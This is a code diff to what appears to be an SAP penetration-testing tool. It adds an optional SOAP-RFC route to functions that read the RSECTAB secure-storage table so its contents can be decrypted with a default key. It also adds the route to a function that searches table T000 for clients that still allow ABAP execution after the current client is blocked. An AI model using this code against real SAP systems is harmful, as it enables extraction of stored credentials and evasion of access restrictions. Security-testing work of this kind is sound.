@@ -870,20 +870,37 @@ _ABAP_READ_RSECTAB = [
 # Client fallback helpers
 # ---------------------------------------------------------------------------
 
-def _find_open_clients(node, creds) -> list:
+def _find_open_clients(node, creds, soap_session=None) -> list:
     """Find clients on this system where ABAP exec is allowed.
 
     Reads T000 via RFC_READ_TABLE (works in any client) and returns
     client numbers where CCCORACTIV is blank or '1' (changes allowed),
     excluding the current client.
+
+    When ``soap_session`` is supplied, routes the T000 read via
+    SOAP-RFC — eliminates the 60s pyrfc-on-3340 timeout on firewalled
+    HTTP-only targets.
     """
     try:
-        clients = sapmap_rfc.get_client_roles(node, creds)
+        if soap_session is not None:
+            r = soap_session.read_table(
+                "T000",
+                fields=["MANDT", "CCCATEGORY", "CCCORACTIV"],
+                max_rows=200,
+            )
+            if not r.get("ok"):
+                print(f"[-] {node.sid}: T000 read via SOAP failed: "
+                      f"{r.get('error', 'unknown')[:120]}")
+                return []
+            clients = r["rows"]
+        else:
+            clients = sapmap_rfc.get_client_roles(node, creds)
         open_clients = []
+        current_client = creds.client if creds else ""
         for c in clients:
             mandt = c.get("MANDT", "")
             cccoractiv = c.get("CCCORACTIV", "")
-            if mandt == creds.client:
+            if mandt == current_client:
                 continue  # skip current (failed) client
             # blank or "1" = changes allowed; "2"/"3" = locked
             if cccoractiv in ("", "1"):
@@ -1079,13 +1096,15 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
         # --- Step 2c: RFC_READ_TABLE fallback (unreliable for RAW) ---
         print(f"[*] {node.sid}: SXPG DB query failed, "
               f"falling back to RFC_READ_TABLE")
-        rows = _read_rsectab_via_rfc(node, creds)
+        rows = _read_rsectab_via_rfc(
+            node, creds, soap_session=soap_session)
 
     # --- Step 2d: Client fallback if everything above failed ---
     if not rows and abap_blocked:
         print(f"[*] {node.sid}: Client {creds.client} blocks ABAP exec, "
               f"searching for open client...")
-        open_clients = _find_open_clients(node, creds)
+        open_clients = _find_open_clients(
+            node, creds, soap_session=soap_session)
         if open_clients:
             print(f"[*] {node.sid}: Open clients found: {', '.join(open_clients)}")
             for alt_client in open_clients:
@@ -1232,14 +1251,31 @@ def _read_rsectab_via_abap(node, creds,
         return None
 
 
-def _read_rsectab_via_rfc(node, creds) -> list | None:
-    """Fallback: read RSECTAB via RFC_READ_TABLE (unreliable for RAW fields)."""
+def _read_rsectab_via_rfc(node, creds, soap_session=None) -> list | None:
+    """Fallback: read RSECTAB via RFC_READ_TABLE (unreliable for RAW fields).
+
+    When ``soap_session`` is supplied, routes the RFC_READ_TABLE call
+    via SOAP-RFC.  Bypasses the 60s pyrfc-on-3340 timeout on firewalled
+    HTTP-only targets.
+    """
     try:
-        raw_rows = sapmap_rfc.read_table(
-            node, "RSECTAB",
-            fields=["IDENT", "DATA"],
-            where="", max_rows=9999, creds=creds,
-        )
+        if soap_session is not None:
+            r = soap_session.read_table(
+                "RSECTAB",
+                fields=["IDENT", "DATA"],
+                max_rows=9999,
+            )
+            if not r.get("ok"):
+                print(f"[-] SecStore RFC_READ_TABLE failed: "
+                      f"{r.get('error', 'unknown')[:200]}")
+                return None
+            raw_rows = r["rows"]
+        else:
+            raw_rows = sapmap_rfc.read_table(
+                node, "RSECTAB",
+                fields=["IDENT", "DATA"],
+                where="", max_rows=9999, creds=creds,
+            )
         rows = []
         for r in raw_rows:
             ident    = (r.get("IDENT") or "").strip()
